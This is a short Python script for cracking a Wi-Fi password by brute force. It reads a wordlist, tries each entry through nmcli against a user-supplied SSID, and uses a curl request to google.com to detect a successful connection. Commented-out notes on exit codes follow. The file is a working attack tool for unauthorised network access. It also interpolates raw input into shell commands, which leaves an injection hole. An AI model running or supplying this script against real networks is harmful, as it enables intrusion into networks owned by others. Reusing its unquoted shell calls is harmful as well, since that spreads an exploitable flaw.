from os import system
from time import sleep


ssid = input("Enter the (SSID), of the Network you want to crack: ")
status = system("nmcli d disconnect wlan0")
system("ifconfig wlan0 up")

with open("/home/lucifer-morningstar/Desktop/the_wifi_hack/wordlist") as pass_file:
    for each_password in pass_file:
        system(f"nmcli d wifi connect {ssid} password {each_password} ifname wlan0")
        ping = system("curl -I https://google.com")
        if ping == 0:
            print(f"\n\n***Successfully cracked {ssid} using password {each_password}***\n\n")
            break


































# status = system(f"curl -I https://linuxhint.com/")
# print(status)

# print(type(status))
# try:
    # system("ping google.com")
# except Exception as err:
    # print(f"error is {err}")
# 0
# if wifi not connected then its 1536
# if wifi is connected then its 0
